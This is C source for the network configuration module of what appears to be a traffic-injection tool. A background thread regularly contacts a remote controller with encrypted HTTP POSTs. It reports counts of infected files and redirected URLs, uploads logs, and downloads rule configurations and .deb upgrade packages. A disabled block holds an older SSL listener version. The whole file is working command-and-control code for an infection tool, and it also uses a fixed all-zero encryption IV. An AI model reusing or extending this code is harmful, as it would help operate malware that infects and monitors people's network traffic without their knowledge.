/*
    MODULE -- network configuration module (RNC)

    Copyright (C) Alberto Ornaghi

    $Id: netconf.c 3558 2011-06-07 10:59:30Z alor $
*/

#define _GNU_SOURCE
#include <main.h>
#include <file.h>
#include <netconf.h>
#include <threads.h>
#include <openssl/ssl.h>
#include <openssl/bio.h>
#include <openssl/evp.h>
#include <json.h>
#include <netdb.h>
#include <signal.h>
#include <dirent.h>
#include <sys/statvfs.h>

/* globals */


/* protos */

void netconf_start(void);
MY_THREAD_FUNC(rnc_communicator);
int rnc_retrieve(BIO *pbio, int type);
int rnc_retrievehandler(BIO *pbio, int cl, int type);
int rnc_config(json_object *json);
int rnc_confighandler(char *data, int len);
int rnc_upgrade(json_object *json);
int rnc_upgradehandler(char *data, int len);
int rnc_sendstats(BIO *pbio);
#if 0
/* Old RNC protocol */

void netconf_start(void);
MY_THREAD_FUNC(rnc_communicator);
#if 0
static int tcp_connect(char *host, int port);
static int tcp_accept(int sock);
#endif
int ssl_proto_read(BIO *ssl, void *buf, int num);
int ssl_proto_write(BIO *ssl, void *buf, int num);
void rnc_handleproto(BIO *ssl);
int rnc_sendversion(BIO *ssl);
int rnc_sendmonitor(BIO *ssl, char *status, char *desc);
int rnc_retrieveconf(BIO *ssl);
int rnc_retrieveupgrade(BIO *ssl);
int rnc_retrievecert(BIO *ssl);
int rnc_sendlogs(BIO *ssl);
#endif
void get_system_stats(u_int *disk, u_int *cpu, u_int *pcpu);

/************************************************/

void netconf_start(void)
{
   /* check when to not initialize the proxy */
   if (GBL_OPTIONS->read) {
      DEBUG_MSG(D_INFO, "netconf_start: skipping... (reading offline)");
      return;
   }

   my_thread_new("netconf", "RNC communication module", &rnc_communicator, NULL);
}

MY_THREAD_FUNC(rnc_communicator)
{
   BIO *pbio = NULL;
   char *rnc_server = NULL;
   int retvalue = -1;

   /* initialize the thread */
   my_thread_init();

   SSL_load_error_strings();
   SSL_library_init();
   OpenSSL_add_all_ciphers();

   SAFE_CALLOC(rnc_server, strlen(GBL_NETCONF->rnc_server) + strlen(GBL_NETCONF->rnc_port) + 2, sizeof(char));
   snprintf(rnc_server, strlen(GBL_NETCONF->rnc_server) + strlen(GBL_NETCONF->rnc_port) + 2, "%s:%s", 
            GBL_NETCONF->rnc_server, GBL_NETCONF->rnc_port);
   rnc_server[strlen(GBL_NETCONF->rnc_server) + strlen(GBL_NETCONF->rnc_port) + 1] = '\0';

   DEBUG_MSG(D_INFO, "RNC starting with server [%s]", rnc_server);

   /* main loop for contact the RNC server */
   while (1) {
      /* Send stats: STATUS and LOG */
      do {
         if (! (pbio = BIO_new_connect(rnc_server)))
            break;

         if (BIO_do_connect(pbio) <= 0) {
            DEBUG_MSG(D_ERROR, "Unable to connect to RNC server [%s]", rnc_server);
            break;
         } else {
            DEBUG_MSG(D_INFO, "Connected to RNC server [%s]", rnc_server);
         }

         retvalue = rnc_sendstats(pbio);

         DEBUG_MSG(D_INFO, "RNC STATUS and LOG [%s]", retvalue == 0 ? "OK" : "ERROR");

         if (! retvalue)
            fclose(open_data("tmp", "stat_sended", FOPEN_WRITE_TEXT));
         else
            fclose(open_data("tmp", "stat_nosended", FOPEN_WRITE_TEXT));
      } while (0);

      if (pbio) {
         BIO_free(pbio);
         pbio = NULL;
      }

      /* Retrieve conf: CONFIG_REQUEST */
      do {
         if (! (pbio = BIO_new_connect(rnc_server)))
            break;

         if (BIO_do_connect(pbio) <= 0) {
            DEBUG_MSG(D_ERROR, "Unable to connect to RNC server [%s]", rnc_server);
            break;
         } else {
            DEBUG_MSG(D_INFO, "Connected to RNC server [%s]", rnc_server);
         }

         retvalue = rnc_retrieve(pbio, RNC_PROTO_CONFIG_REQUEST);

         DEBUG_MSG(D_INFO, "RNC CONFIG REQUEST [%s]", retvalue == 0 ? "OK" : retvalue == 1 ? "NONE" : "ERROR");

         if (! retvalue) {
            fclose(open_data("tmp", "conf_received", FOPEN_WRITE_TEXT));

            DEBUG_MSG(D_INFO, "New configuration, sending signal to reload them...");

            /* reload the new config, the signal handler will reload them */
            kill(getpid(), SIGHUP);
         } else if (retvalue == 1)
            fclose(open_data("tmp", "conf_noreceived", FOPEN_WRITE_TEXT));
      } while (0);

      if (pbio) {
         BIO_free(pbio);
         pbio = NULL;
      }

      /* Retrieve conf: UPGRADE_REQUEST */
      do {
         if (! (pbio = BIO_new_connect(rnc_server)))
            break;

         if (BIO_do_connect(pbio) <= 0) {
            DEBUG_MSG(D_ERROR, "Unable to connect to RNC server [%s]", rnc_server);
            break;
         } else {
            DEBUG_MSG(D_INFO, "Connected to RNC server [%s]", rnc_server);
         }

         retvalue = rnc_retrieve(pbio, RNC_PROTO_UPGRADE_REQUEST);

         DEBUG_MSG(D_INFO, "RNC UPGRADE REQUEST [%s]", retvalue == 0 ? "OK" : retvalue == 1 ? "NONE" : "ERROR");

         if (! retvalue)
            fclose(open_data("tmp", "upgrade_received", FOPEN_WRITE_TEXT));
         else
            fclose(open_data("tmp", "upgrade_noreceived", FOPEN_WRITE_TEXT));
      } while (0);

      if (pbio) {
         BIO_free(pbio);
         pbio = NULL;
      }

      /* Interval time to contact the RNC server */
      sleep(30);
   }

   SAFE_FREE(rnc_server);

   /* NEVER REACHED */
   return NULL;
}

int rnc_retrieve(BIO *pbio, int type)
{
   char buf[1024];
   char *cmdconfig = "{\"command\":\"CONFIG_REQUEST\",\"params\":{},\"body\":\"\"}";
   char *cmdupgrade = "{\"command\":\"UPGRADE_REQUEST\",\"params\":{},\"body\":\"\"}";
   unsigned char iv[16];
   char *memptr = NULL;
   BIO *bbuf = NULL, *bmem = NULL, *bbase64 = NULL, *bcipher = NULL;
   long memlen = 0;
   int len = 0, ret = 0, error = 0, cl = 0, retvalue = -1;

   do {
      if (! (bmem = BIO_new(BIO_s_mem()))) {
         DEBUG_MSG(D_ERROR, "Cannot retrieve from RNC");
         break;
      }

      if (! (bbase64 = BIO_new(BIO_f_base64()))) {
         DEBUG_MSG(D_ERROR, "Cannot retrieve from RNC");
         break;
      }

      if (! (bcipher = BIO_new(BIO_f_cipher()))) {
         DEBUG_MSG(D_ERROR, "Cannot retrieve from RNC");
         break;
      }

      memset(iv, '\0', sizeof(iv));
      BIO_set_cipher(bcipher, EVP_get_cipherbyname("aes-128-cbc"), (unsigned char *)GBL_NETCONF->rnc_key, iv, 1);

      BIO_push(bbase64, bmem);
      BIO_push(bcipher, bbase64);

      switch (type) {
         case RNC_PROTO_CONFIG_REQUEST:
            if (BIO_write(bcipher, cmdconfig, strlen(cmdconfig)) != strlen(cmdconfig)) {
               error = 1;
               DEBUG_MSG(D_ERROR, "Cannot retrieve from RNC");
               break;
            }
            break;

         case RNC_PROTO_UPGRADE_REQUEST:
            if (BIO_write(bcipher, cmdupgrade, strlen(cmdupgrade)) != strlen(cmdupgrade)) {
               error = 1;
               DEBUG_MSG(D_ERROR, "Cannot retrieve from RNC");
               break;
            }
            break;
      }

      if (error == 1)
         break;

      (void)BIO_flush(bcipher);

      if (! (memlen = BIO_get_mem_data(bmem, &memptr))) {
         DEBUG_MSG(D_ERROR, "Cannot retrieve from RNC");
         break;
      }

      if (BIO_printf(pbio, "POST / HTTP/1.0\r\n" \
                           "Host: %s\r\n" \
                           "Accept: */" "*\r\n" \
                           "Cookie: %s\r\n" \
                           "Content-Length: %ld\r\n" \
                           "Content-Type: application/octet-stream\r\n" \
                           "Connection: close\r\n" \
                           "\r\n", GBL_NETCONF->rnc_server, GBL_NETCONF->rnc_cookie, memlen) <= 0) {
         DEBUG_MSG(D_ERROR, "Cannot retrieve from RNC");
         break;
      }

      if (BIO_write(pbio, memptr, memlen) != memlen) {
         DEBUG_MSG(D_ERROR, "Cannot retrieve from RNC");
         break;
      }

      (void)BIO_flush(pbio);
   } while(0);

   if (bmem)
      BIO_free(bmem);

   if (bbase64)
      BIO_free(bbase64);

   if (bcipher)
      BIO_free(bcipher);

   DEBUG_MSG(D_INFO, "Retrieve from RNC...");

   do {
      bbuf = BIO_new(BIO_s_mem());

      for (len = 0; ; len = 0) {
         while (len < sizeof(buf)) {
            ret = BIO_read(pbio, buf + len, 1);

            if (ret == -1) {
               error = 1;
               DEBUG_MSG(D_ERROR, "Cannot retrieve from RNC");
               break;
            } else if (ret == 0)
               break;

            if (buf[len++] == '\n')
               break;
         }

         buf[--len] = '\0';

         if (len && (buf[len - 1] == '\r'))
            buf[len - 1] = '\0';

         if (! buf[0])
            break;

         if (! strncasecmp(buf, "Content-Length: ", strlen("Content-Length: ")))
            cl = atoi(buf + strlen("Content-Length: "));

         if (BIO_printf(bbuf, "%s\r\n", buf) <= 0) {
            DEBUG_MSG(D_ERROR, "Cannot retrieve from RNC");
            break;
         }
      }

      if (error == 1)
         break;

      retvalue = rnc_retrievehandler(pbio, cl, type);
   } while(0);

   if (bbuf)
      BIO_free(bbuf);

   return retvalue;
}

int rnc_retrievehandler(BIO *pbio, int cl, int type)
{
   char buf[100 * 1024];
   unsigned char iv[16];
   BIO *bmem = NULL, *bbody = NULL, *bbase64 = NULL, *bcipher = NULL;
   json_object *json = NULL, *jcommand = NULL;
   char *memptr = NULL, *c = NULL, *command = NULL;
   long blen = 0;
   int ret = 0, error = 0, retvalue = -1;

   do {
      if (! (bmem = BIO_new(BIO_s_mem()))) {
         DEBUG_MSG(D_ERROR, "Cannot handle retrieved from RNC");
         break;
      }

      if (! (bbody = BIO_new(BIO_s_mem()))) {
         DEBUG_MSG(D_ERROR, "Cannot handle retrieved from RNC");
         break;
      }

      if (! (bbase64 = BIO_new(BIO_f_base64()))) {
         DEBUG_MSG(D_ERROR, "Cannot handle retrieved from RNC");
         break;
      }

      BIO_set_flags(bbase64, BIO_FLAGS_BASE64_NO_NL);

      if (! (bcipher = BIO_new(BIO_f_cipher()))) {
         DEBUG_MSG(D_ERROR, "Cannot handle retrieved from RNC");
         break;
      }

      memset(iv, '\0', sizeof(iv));
      BIO_set_cipher(bcipher, EVP_get_cipherbyname("aes-128-cbc"), (unsigned char *)GBL_NETCONF->rnc_key, iv, 0);

      BIO_push(bbase64, bbody);
      BIO_push(bcipher, bmem);

      while (blen < cl) {
         ret = BIO_read(pbio, buf, ((cl - blen) > sizeof(buf)) ? sizeof(buf) : (cl - blen));

         if (ret == -1) {
            error = 1;
            DEBUG_MSG(D_ERROR, "Cannot handle retrieved from RNC");
            break;
         } else if (ret == 0)
            break;

         blen += ret;

         while((c = memchr(buf, '\n', ret)) || (c = memchr(buf, '\r', ret))) {
            memmove(c, c + 1, --ret - (c - buf));
         }

         if (BIO_write(bbody, buf, ret) != ret) {
            error = 1;
            DEBUG_MSG(D_ERROR, "Cannot handle retrieved from RNC");
            break;
         }

         do {
            ret = BIO_read(bbase64, buf, sizeof(buf));

            if (ret > 0) {
               if (BIO_write(bcipher, buf, ret) != ret) {
                  error = 1;
                  DEBUG_MSG(D_ERROR, "Cannot handle retrieved from RNC");
                  break;
               }
            }
         } while (ret > 0);

         if (error == 1)
            break; 
      }

      if (error == 1)
         break;

      (void)BIO_flush(bcipher);

      if (BIO_get_mem_data(bmem, &memptr) <= 0) {
         DEBUG_MSG(D_ERROR, "Cannot handle retrieved from RNC");
         break;
      }

      if (*(memptr + 0) == '[')
         memptr += 1;

      if (*(memptr + strlen(memptr)) == ']')
         *(memptr + strlen(memptr)) = '\0';

      if (! (json = json_tokener_parse(memptr))) {
         DEBUG_MSG(D_ERROR, "Cannot handle retrieved from RNC");
         break;
      }

      if (! (jcommand = json_object_object_get(json, "command"))) {
         DEBUG_MSG(D_ERROR, "Cannot handle retrieved from RNC");
         break;
      }

      if (! (command = (char *)json_object_get_string(jcommand))) {
         DEBUG_MSG(D_ERROR, "Cannot handle retrieved from RNC");
         break;
      }

      switch (type) {
         case RNC_PROTO_CONFIG_REQUEST:
            if (! strcasecmp(command, "CONFIG_REQUEST")) {
               DEBUG_MSG(D_INFO, "Configuration retrieved from RNC [%d]", strlen(memptr));
               retvalue = rnc_config(json);
            } else {
               error = 1;
            }
            break;

         case RNC_PROTO_UPGRADE_REQUEST:
            if (! strcasecmp(command, "UPGRADE_REQUEST")) {
               DEBUG_MSG(D_INFO, "Upgrade retrieved from RNC [%d]", strlen(memptr));
               retvalue = rnc_upgrade(json);
            } else {
               error = 1;
            }
            break;
      }

      if (error == 1) {
         DEBUG_MSG(D_ERROR, "Cannot handle retrieved from RNC");
         break;
      }
   } while (0);

   if (bmem)
      BIO_free(bmem);

   if (bbody)
      BIO_free(bbody);

   if (bbase64)
      BIO_free(bbase64);

   if (bcipher)
      BIO_free(bcipher);

   if (json)
      json_object_put(json);

   return retvalue;
}

int rnc_config(json_object *json)
{
   json_object *jresult = NULL, *jstatus = NULL, *jmsg = NULL, *jtype = NULL, *jbody = NULL;
   char *status = NULL, *type = NULL, *data = NULL;
   int len = 0, retvalue = -1;

   do {
      if (! (jresult = json_object_object_get(json, "result"))) {
         DEBUG_MSG(D_ERROR, "Cannot handle configuration retrieved from RNC");
         break;
      }

      if (! (jstatus = json_object_object_get(jresult, "status"))) {
         DEBUG_MSG(D_ERROR, "Cannot handle configuration retrieved from RNC");
         break;
      }

      if (! (status = (char *)json_object_get_string(jstatus))) {
         DEBUG_MSG(D_ERROR, "Cannot handle configuration retrieved from RNC");
         break;
      }

      if (! strcasecmp(status, "OK")) {
         DEBUG_MSG(D_INFO, "New configuration from RNC...");
      } else if (! strcasecmp(status, "ERROR")) {
         DEBUG_MSG(D_INFO, "NO new configuration this time from RNC...");
         retvalue = 1;
         break;
      } else {
         DEBUG_MSG(D_ERROR, "Cannot handle configuration retrieved from RNC");
         break;
      }

      /* Status is OK */

      if (! (jmsg = json_object_object_get(jresult, "msg"))) {
         DEBUG_MSG(D_ERROR, "Cannot handle new configuration retrieved from RNC");
         break;
      }

      if (! (jtype = json_object_object_get(jmsg, "type"))) {
         DEBUG_MSG(D_ERROR, "Cannot handle new configuration retrieved from RNC");
         break;
      }

      if (! (type = (char *)json_object_get_string(jtype))) {
         DEBUG_MSG(D_ERROR, "Cannot handle new configuration retrieved from RNC");
         break;
      }

      if (! strcasecmp(type, "rules")) {
         DEBUG_MSG(D_INFO, "Type of new configuration is supported [rules]");
      } else {
         DEBUG_MSG(D_ERROR, "Cannot handle new configuration retrieved from RNC");
         break;
      }

      /* Type is rules */

      if (! (jbody = json_object_object_get(jmsg, "body"))) {
         DEBUG_MSG(D_ERROR, "Cannot handle new configuration retrieved from RNC");
         break;
      }

      if (! (data = (char *)json_object_get_string(jbody))) {
         DEBUG_MSG(D_ERROR, "Cannot handle new configuration retrieved from RNC");
         break;
      }

      if (! (len = strlen(data))) {
         DEBUG_MSG(D_ERROR, "Cannot handle new configuration retrieved from RNC");
         break;
      }

      retvalue = rnc_confighandler(data, len);
   } while (0);

   return retvalue;
}

int rnc_confighandler(char *data, int len)
{
   char buf[100 * 1024];
   RncProtoConfig pconfig;
   BIO *bmem = NULL, *bbase64 = NULL, *bfile = NULL;
   FILE *fp = NULL;
   int ret = 0, blen = 0, error = 0, success = 0, retvalue = -1;

   DEBUG_MSG(D_INFO, "New configuration from RNC is supported [%d]", len);

   pconfig.filename = "/opt/td-config/share/NetworkInjectorConfig.zip";

   do {
      if (! (bmem = BIO_new_mem_buf(data, len))) {
         DEBUG_MSG(D_ERROR, "Cannot handle new configuration retrieved from RNC");
         break;
      }

      if (! (bbase64 = BIO_new(BIO_f_base64()))) {
         DEBUG_MSG(D_ERROR, "Cannot handle new configuration retrieved from RNC");
         break;
      }

      BIO_set_flags(bbase64, BIO_FLAGS_BASE64_NO_NL);
      BIO_push(bbase64, bmem);

      if ((fp = fopen(pconfig.filename, "r")) != NULL) {
         fclose(fp);

         DEBUG_MSG(D_INFO, "Delete old configuration...");

         if (remove(pconfig.filename) == -1) {
            DEBUG_MSG(D_ERROR, "Cannot handle new configuration retrieved from RNC");
            break;
         } 
      }

      if (! (bfile = BIO_new_file(pconfig.filename, "w"))) {
         DEBUG_MSG(D_ERROR, "Cannot handle new configuration retrieved from RNC");
         break;
      }

      do {
         ret = BIO_read(bbase64, buf, sizeof(buf));

         if (ret > 0) {
            blen += ret;

            if (BIO_write(bfile, buf, ret) != ret) {
               error = 1;
               DEBUG_MSG(D_ERROR, "Cannot handle new configuration retrieved from RNC");
               break;
            }
         }
      } while (ret > 0);

      BIO_free(bfile);

      if (error == 1)
         break;

      DEBUG_MSG(D_INFO, "New configuration from RNC is checked and corrected [%d]", blen);

      //TODO

      success = 1;
      retvalue = 0;
   } while(0);

   if (! success) {
      if ((fp = fopen(pconfig.filename, "r")) != NULL) {
         fclose(fp);
         remove(pconfig.filename);
      }
   }

   if (bmem)
      BIO_free(bmem);

   if (bbase64)
      BIO_free(bbase64);

   return retvalue;
}

int rnc_upgrade(json_object *json)
{
   json_object *jresult = NULL, *jstatus = NULL, *jmsg = NULL, *jbody = NULL;
   char *status = NULL, *data = NULL;
   int len = 0, retvalue = -1;

   do {
      if (! (jresult = json_object_object_get(json, "result"))) {
         DEBUG_MSG(D_ERROR, "Cannot handle upgrade retrieved from RNC");
         break;
      }

      if (! (jstatus = json_object_object_get(jresult, "status"))) {
         DEBUG_MSG(D_ERROR, "Cannot handle upgrade retrieved from RNC");
         break;
      }

      if (! (status = (char *)json_object_get_string(jstatus))) {
         DEBUG_MSG(D_ERROR, "Cannot handle upgrade retrieved from RNC");
         break;
      }

      if (! strcasecmp(status, "OK")) {
         DEBUG_MSG(D_INFO, "New upgrade from RNC...");
      } else if (! strcasecmp(status, "ERROR")) {
         DEBUG_MSG(D_INFO, "NO new upgrade this time from RNC...");
         retvalue = 1;
         break;
      } else {
         DEBUG_MSG(D_ERROR, "Cannot handle upgrade retrieved from RNC");
         break;
      }

      /* Status is OK */

      if (! (jmsg = json_object_object_get(jresult, "msg"))) {
         DEBUG_MSG(D_ERROR, "Cannot handle new upgrade retrieved from RNC");
         break;
      }

      if (! (jbody = json_object_object_get(jmsg, "body"))) {
         DEBUG_MSG(D_ERROR, "Cannot handle new configuration retrieved from RNC");
         break;
      }

      if (! (data = (char *)json_object_get_string(jbody))) {
         DEBUG_MSG(D_ERROR, "Cannot handle new configuration retrieved from RNC");
         break;
      }

      if (! (len = strlen(data))) {
         DEBUG_MSG(D_ERROR, "Cannot handle new configuration retrieved from RNC");
         break;
      }

      retvalue = rnc_upgradehandler(data, len);
   } while (0);

   return retvalue;
}

int rnc_upgradehandler(char *data, int len)
{
   char buf[100 * 1024];
   RncProtoUpgrade pupgrade;
   BIO *bmem = NULL, *bbase64 = NULL, *bfile = NULL;
   FILE *fp = NULL;
   int ret = 0, blen = 0, error = 0, success = 0, retvalue = -1;

   DEBUG_MSG(D_INFO, "New upgrade from RNC is supported [%d]", len);

   pupgrade.filename = "/opt/td-config/share/NetworkInjectorUpgrade.deb";

   do {
      if (! (bmem = BIO_new_mem_buf(data, len))) {
         DEBUG_MSG(D_ERROR, "Cannot handle new upgrade retrieved from RNC");
         break;
      }

      if (! (bbase64 = BIO_new(BIO_f_base64()))) {
         DEBUG_MSG(D_ERROR, "Cannot handle new upgrade retrieved from RNC");
         break;
      }

      BIO_set_flags(bbase64, BIO_FLAGS_BASE64_NO_NL);
      BIO_push(bbase64, bmem);

      if ((fp = fopen(pupgrade.filename, "r")) != NULL) {
         fclose(fp);

         DEBUG_MSG(D_INFO, "Delete old upgrade...");

         if (remove(pupgrade.filename) == -1) {
            DEBUG_MSG(D_ERROR, "Cannot handle new upgrade retrieved from RNC");
            break;
         }
      }

      if (! (bfile = BIO_new_file(pupgrade.filename, "w"))) {
         DEBUG_MSG(D_ERROR, "Cannot handle new upgrade retrieved from RNC");
         break;
      }

      do {
         ret = BIO_read(bbase64, buf, sizeof(buf));

         if (ret > 0) {
            blen += ret;

            if (BIO_write(bfile, buf, ret) != ret) {
               error = 1;
               DEBUG_MSG(D_ERROR, "Cannot handle new upgrade retrieved from RNC");
               break;
            }
         }
      } while (ret > 0);

      BIO_free(bfile);

      if (error == 1)
         break;

      DEBUG_MSG(D_INFO, "New upgrade from RNC is checked and corrected [%d]", blen);

      success = 1;
      retvalue = 0;
   } while(0);

   if (! success) {
      if ((fp = fopen(pupgrade.filename, "r")) != NULL) {
         fclose(fp);
         remove(pupgrade.filename);
      }
   }

   if (bmem)
      BIO_free(bmem);

   if (bbase64)
      BIO_free(bbase64);

   return retvalue;
}

int rnc_sendstats(BIO *pbio)
{
   RncProtoMonitor pmonitor;
   RncProtoLog plog;
   char descr[1024], buf[1024];
   char *cmdstatus = "{\"command\":\"STATUS\"," \
                     "\"params\":{\"version\":\"%s\",\"status\":\"%s\",\"msg\":\"%s\"," \
                     "\"stats\":{\"disk\":\"%d\",\"cpu\":\"%d\",\"pcpu\":\"%d\"}}}";
   char *cmdlog = "{\"command\":\"LOG\",\"params\":{\"time\": %lu,\"type\":\"%s\",\"desc\":\"%s\"}}";
   unsigned char iv[16];
   char *memptr = NULL, *type = NULL;
   BIO *bmem = NULL, *bbase64 = NULL, *bcipher = NULL;
   long memlen = 0;
   int count = 0, retvalue = -1;

   do {
      if (! (bmem = BIO_new(BIO_s_mem()))) {
         DEBUG_MSG(D_ERROR, "Cannot sending monitor and log information to RNC");
         break;
      }

      if (! (bbase64 = BIO_new(BIO_f_base64()))) {
         DEBUG_MSG(D_ERROR, "Cannot sending monitor and log information to RNC");
         break;
      }

      if (! (bcipher = BIO_new(BIO_f_cipher()))) {
         DEBUG_MSG(D_ERROR, "Cannot sending monitor and log information to RNC");
         break;
      }

      memset(iv, '\0', sizeof(iv));
      BIO_set_cipher(bcipher, EVP_get_cipherbyname("aes-128-cbc"), (unsigned char *)GBL_NETCONF->rnc_key, iv, 1);

      BIO_push(bbase64, bmem);
      BIO_push(bcipher, bbase64);

      if (BIO_write(bcipher, "[", 1) <= 0) {
         DEBUG_MSG(D_ERROR, "Cannot sending monitor and log information to RNC");
         break;
      }

      memset(&pmonitor, 0, sizeof(pmonitor));

      /* monitor parameters */
      get_system_stats(&pmonitor.disk, &pmonitor.cpu, &pmonitor.pcpu);

      if (GBL_NET->network_error) {
         snprintf(pmonitor.status, sizeof(pmonitor.status), "%s", "ERROR");
         snprintf(pmonitor.desc, sizeof(pmonitor.desc), "%s", "PROXY_IP is invalid, please fix the configuration...");
      } else {
         snprintf(descr, sizeof(descr), 
                  "Active users: %u of %u   Redirected FQDN: %u   Redirected URL: %u   File Infected: %u", 
                  (u_int)GBL_STATS->active_users, 
                  (u_int)GBL_STATS->tot_users, 
                  (u_int)GBL_STATS->redir_fqdn, 
                  (u_int)GBL_STATS->redir_url, 
                  (u_int)GBL_STATS->inf_files);

         snprintf(pmonitor.status, sizeof(pmonitor.status), "%s", "OK");
         snprintf(pmonitor.desc, sizeof(pmonitor.desc), "%s", descr);
      }

      /* STATUS command */
      if (BIO_printf(bcipher, cmdstatus, 
                     GBL_RCS_VERSION, pmonitor.status, pmonitor.desc, pmonitor.disk, pmonitor.cpu, pmonitor.pcpu) <= 0) {
         DEBUG_MSG(D_ERROR, "Cannot sending monitor and log information to RNC");
         break;
      }

      /* send logs until there are any in the cache */
      while (log_get(&plog)) {
         /* log parameters */
         switch(plog.type) {
            case RNC_LOG_INFO:
               type = "INFO";
               break;

            case RNC_LOG_ERROR:
               type = "ERROR";
               break;

            case RNC_LOG_DEBUG:
               type = "DEBUG";
               break;
         }

         if (BIO_write(bcipher, ",", 1) <= 0) {
            count = -1;
            break;
         }

         /* LOG command */
         if (BIO_printf(bcipher, cmdlog, plog.ts, type, plog.desc) <= 0) {
            count = -1;
            break;
         }

         count++;
      }

      if (count == -1) {
         DEBUG_MSG(D_ERROR, "Cannot sending monitor and log information to RNC");
         break;
      }

      if (BIO_write(bcipher, "]", 1) <= 0) {
         DEBUG_MSG(D_ERROR, "Cannot sending monitor and log information to RNC");
         break;
      }

      (void)BIO_flush(bcipher);

      if (! (memlen = BIO_get_mem_data(bmem, &memptr))) {
         DEBUG_MSG(D_ERROR, "Cannot sending monitor and log information to RNC");
         break;
      }

      if (BIO_printf(pbio, "POST / HTTP/1.0\r\n" \
                           "Host: %s\r\n" \
                           "Accept: */" "*\r\n" \
                           "Cookie: %s\r\n" \
                           "Content-Length: %ld\r\n" \
                           "Content-Type: application/octet-stream\r\n" \
                           "Connection: close\r\n" \
                           "\r\n", GBL_NETCONF->rnc_server, GBL_NETCONF->rnc_cookie, memlen) <= 0) {
         DEBUG_MSG(D_ERROR, "Cannot sending monitor and log information to RNC");
         break;
      }

      if (BIO_write(pbio, memptr, memlen) != memlen) {
         DEBUG_MSG(D_ERROR, "Cannot sending monitor and log information to RNC");
         break;
      }

      (void)BIO_flush(pbio); 

      DEBUG_MSG(D_INFO, "Sending monitor information to RNC [%s]", descr);
      DEBUG_MSG(D_INFO, "Sending log information to RNC [%d]", count);

      while ((memlen = BIO_read(pbio, buf, sizeof(buf))) > 0);

      retvalue = 0;
   } while(0);

   if (bmem)
      BIO_free(bmem);

   if (bbase64)
      BIO_free(bbase64);

   if (bcipher)
      BIO_free(bcipher);

   return retvalue;
}

#if 0
/* Old RNC protocol */

void netconf_start(void)
{
   /* check when to not initialize the proxy */
   if (GBL_OPTIONS->read) {
      DEBUG_MSG(D_INFO, "netconf_start: skipping... (reading offline)");
      return;
   }

   my_thread_new("netconf", "RNC communication module", &rnc_communicator, NULL);
}

MY_THREAD_FUNC(rnc_communicator)
{
   SSL_CTX *ctx;
   SSL *ssl;
   BIO *sbio, *abio, *cbio;
   char *certfile;
   char listen_port[32];

   /* initialize the thread */
   my_thread_init();

   SSL_library_init();
   SSL_load_error_strings();
   OpenSSL_add_all_algorithms();

   /* create the SSL stuff */
   ctx = SSL_CTX_new(SSLv23_server_method());

   certfile = get_path("etc", "rcs-network.pem");

   if (SSL_CTX_use_certificate_file(ctx, certfile, SSL_FILETYPE_PEM) == 0)
      ERROR_MSG("Cannot load the certificate from %s", certfile);

   if (SSL_CTX_use_PrivateKey_file(ctx, certfile, SSL_FILETYPE_PEM) <= 0)
      ERROR_MSG("Cannot load the private key from %s", certfile);

   if (SSL_CTX_check_private_key(ctx) <= 0)
      ERROR_MSG("Cannot invalid private key from %s", certfile);

   SAFE_FREE(certfile);

   DEBUG_MSG(D_DEBUG, "SSL_CTX initialized");

   /* New SSL BIO setup as server */
   sbio = BIO_new_ssl(ctx, 0);

   BIO_get_ssl(sbio, &ssl);

   if (!ssl)
      ERROR_MSG("Cannot inizialize SSL");

   /* Don't want any retries */
   SSL_set_mode(ssl, SSL_MODE_AUTO_RETRY);

   /* listen on port */
   snprintf(listen_port, sizeof(listen_port), "0.0.0.0:%d", GBL_NETCONF->rnc_port);
   abio = BIO_new_accept(listen_port);

   /* reuse the address */
   BIO_set_bind_mode(abio, BIO_BIND_REUSEADDR);

   BIO_set_accept_bios(abio, sbio);

   /* First call to BIO_accept() sets up accept BIO */
   if (BIO_do_accept(abio) <= 0)
      ERROR_MSG("Cannot bind port %d for RNC communication", GBL_NETCONF->rnc_port);
   else
      DEBUG_MSG(D_INFO, "Server listening on port %d", GBL_NETCONF->rnc_port);

   /* main loop waiting to be contacted by RNC */
   LOOP {

      /* Wait for incoming connection */
      if (BIO_do_accept(abio) <= 0) {
         DEBUG_MSG(D_ERROR, "Cannot perform BIO_do_accept");
         continue;
      }

      /* get the connected client */
      cbio = BIO_pop(abio);

      if (BIO_do_handshake(cbio) <= 0) {
         DEBUG_MSG(D_ERROR, "Cannot handshake SSL");
         continue;
      }

      /* handle the communication with the RNC */
      rnc_handleproto(cbio);

      /* close the connection */
      BIO_ssl_shutdown(cbio);
      (void) BIO_flush(cbio);
      BIO_free_all(cbio);

      DEBUG_MSG(D_DEBUG, "Closing connection");
   }

   SSL_CTX_free(ctx);
   BIO_free(abio);
   BIO_free(sbio);

   /* NEVER REACHED */
   return NULL;
}

#if 0
static int tcp_connect(char *host, int port)
{
   struct hostent *hp;
   struct sockaddr_in addr;
   int sock;

   if ( !(hp = gethostbyname(host)) ) {
      DEBUG_MSG(D_ERROR, "Could not resolve host [%s]", host);
      return -1;
   }

   memset(&addr, 0, sizeof(addr));

   addr.sin_addr = *(struct in_addr*)
   hp->h_addr_list[0];
   addr.sin_family = AF_INET;
   addr.sin_port = htons(port);

   if ((sock = socket(AF_INET,SOCK_STREAM, IPPROTO_TCP)) < 0) {
      DEBUG_MSG(D_ERROR, "Couldn't create socket [%s:%d]", host, port);
      return -1;
   }

   if (connect(sock,(struct sockaddr *)&addr, sizeof(addr)) < 0) {
      DEBUG_MSG(D_ERROR, "Couldn't connect socket [%s:%d]", host, port);
      return -1;
   }

   return sock;
}

static int tcp_accept(int sock)
{
   struct sockaddr_in caddr;
   u_int len = sizeof(struct sockaddr);
   fd_set  fdread;
   struct timeval tv;
   int ret;
   int csock;

   FD_ZERO(&fdread);
   FD_SET(sock, &fdread);
   memset(&caddr, 0, sizeof(caddr));

   /* set the timeout */
   tv.tv_sec = 0;
   tv.tv_usec = 0;

   ret = select(FOPEN_MAX, &fdread, (fd_set *)NULL, (fd_set *)NULL, NULL /*&tv*/);

   if (ret == 0) {
      /* timeout occurred. return false to let the main thread do other things... */
      return 0;
   } else if (ret == -1) {
      DEBUG_MSG(D_ERROR, "tcp_accept - select socket error [%d]", errno);
      return 0;
   }

   csock = accept(sock, (struct sockaddr *)&caddr, &len);

   if (csock == -1 ) {
      DEBUG_MSG(D_ERROR, "tcp_accept - invalid socket [%d]", errno);
      return 0;
   } else {
      DEBUG_MSG(D_DEBUG, "New connection from %s", inet_ntoa(caddr.sin_addr));
      return csock;
   }

   return 0;
}
#endif

int ssl_proto_read(BIO *ssl, void *buf, int num)
{
   int read = 0;
   int len;
   do {
      len = BIO_read(ssl, (char *)buf + read, num - read);
      if (len <= 0) {
         break;
      }
      read += len;
   } while (read < num);

   return read;
}

